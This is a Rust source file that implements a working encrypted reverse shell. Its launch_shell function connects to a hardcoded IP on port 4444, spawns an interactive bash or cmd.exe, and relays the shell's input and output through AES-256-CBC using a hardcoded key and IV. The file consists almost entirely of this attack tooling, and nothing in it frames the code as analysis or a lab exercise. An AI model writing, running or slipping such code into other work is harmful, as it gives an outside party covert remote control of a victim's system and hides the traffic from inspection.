use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use cbc::{Decryptor, Encryptor};

type Aes256CbcEnc = Encryptor<aes::Aes256>;
type Aes256CbcDec = Decryptor<aes::Aes256>;

const KEY: &[u8; 32] = b"initsecurekey1234567890ABCDEFGHI";
const IV: &[u8; 16] = b"initvector123456";

pub struct EncryptedStream {
    stream: TcpStream,
}

impl EncryptedStream {
    pub fn new(stream: TcpStream) -> Self {
        Self { stream }
    }

    pub fn encrypt_and_send(&mut self, data: &[u8]) -> io::Result<()> {
        let block_size = 16;
        let padding_needed = block_size - (data.len() % block_size);
        let padded_len = data.len() + padding_needed;

        let mut buffer = vec![0u8; padded_len];
        buffer[..data.len()].copy_from_slice(data);

        let cipher = Aes256CbcEnc::new(KEY.into(), IV.into());
        let ciphertext = cipher
            .encrypt_padded_mut::<Pkcs7>(&mut buffer, data.len())
            .map_err(|_| io::Error::new(io::ErrorKind::Other, "Encryption failed"))?;

        let len = (ciphertext.len() as u16).to_be_bytes();
        self.stream.write_all(&len)?;
        self.stream.write_all(ciphertext)?;
        self.stream.flush()?;

        Ok(())
    }

    pub fn receive_and_decrypt(&mut self) -> io::Result<Vec<u8>> {
        let mut len_buf = [0u8; 2];
        self.stream.read_exact(&mut len_buf)?;
        let len = u16::from_be_bytes(len_buf) as usize;

        let mut buf = vec![0u8; len];
        self.stream.read_exact(&mut buf)?;

        let cipher = Aes256CbcDec::new(KEY.into(), IV.into());
        match cipher.decrypt_padded_mut::<Pkcs7>(&mut buf) {
            Ok(plaintext) => Ok(plaintext.to_vec()),
            Err(_) => Err(io::Error::new(
                io::ErrorKind::InvalidData,
                "Decryption failed",
            )),
        }
    }
}

pub async fn launch_shell() -> io::Result<()> {
    let sock = TcpStream::connect("172.28.161.20:4444")?;

    #[cfg(unix)]
    {
        use std::thread;

        let mut child = Command::new("/bin/bash")
            .arg("-i")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?;

        let mut child_stdout = child.stdout.take().unwrap();
        let mut child_stderr = child.stderr.take().unwrap();
        let mut child_stdin = child.stdin.take().unwrap();

        let mut encrypted_read = EncryptedStream::new(sock.try_clone()?);
        let mut encrypted_write1 = EncryptedStream::new(sock.try_clone()?);
        let mut encrypted_write2 = EncryptedStream::new(sock.try_clone()?);

        let stdin_thread = thread::spawn(move || loop {
            match encrypted_read.receive_and_decrypt() {
                Ok(data) => {
                    if child_stdin.write_all(&data).is_err() {
                        break;
                    }
                    child_stdin.flush().ok();
                }
                Err(_) => break,
            }
        });

        let stdout_thread = thread::spawn(move || {
            let mut buffer = [0u8; 1024];
            loop {
                match child_stdout.read(&mut buffer) {
                    Ok(0) => break,
                    Ok(n) => {
                        if encrypted_write1.encrypt_and_send(&buffer[..n]).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        let stderr_thread = thread::spawn(move || {
            let mut buffer = [0u8; 1024];
            loop {
                match child_stderr.read(&mut buffer) {
                    Ok(0) => break,
                    Ok(n) => {
                        if encrypted_write2.encrypt_and_send(&buffer[..n]).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        child.wait()?;
        stdin_thread.join().ok();
        stdout_thread.join().ok();
        stderr_thread.join().ok();

        Ok(())
    }

    #[cfg(windows)]
    {
        use std::thread;

        let mut child = Command::new("cmd.exe")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?;

        let mut child_stdout = child.stdout.take().unwrap();
        let mut child_stderr = child.stderr.take().unwrap();
        let mut child_stdin = child.stdin.take().unwrap();

        let mut encrypted_read = EncryptedStream::new(sock.try_clone()?);
        let mut encrypted_write1 = EncryptedStream::new(sock.try_clone()?);
        let mut encrypted_write2 = EncryptedStream::new(sock.try_clone()?);

        let stdin_thread = thread::spawn(move || loop {
            match encrypted_read.receive_and_decrypt() {
                Ok(data) => {
                    if child_stdin.write_all(&data).is_err() {
                        break;
                    }
                    child_stdin.flush().ok();
                }
                Err(_) => break,
            }
        });

        let stdout_thread = thread::spawn(move || {
            let mut buffer = [0u8; 1024];
            loop {
                match child_stdout.read(&mut buffer) {
                    Ok(0) => break,
                    Ok(n) => {
                        if encrypted_write1.encrypt_and_send(&buffer[..n]).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        let stderr_thread = thread::spawn(move || {
            let mut buffer = [0u8; 1024];
            loop {
                match child_stderr.read(&mut buffer) {
                    Ok(0) => break,
                    Ok(n) => {
                        if encrypted_write2.encrypt_and_send(&buffer[..n]).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        child.wait()?;
        stdin_thread.join().ok();
        stdout_thread.join().ok();
        stderr_thread.join().ok();

        Ok(())
    }
}
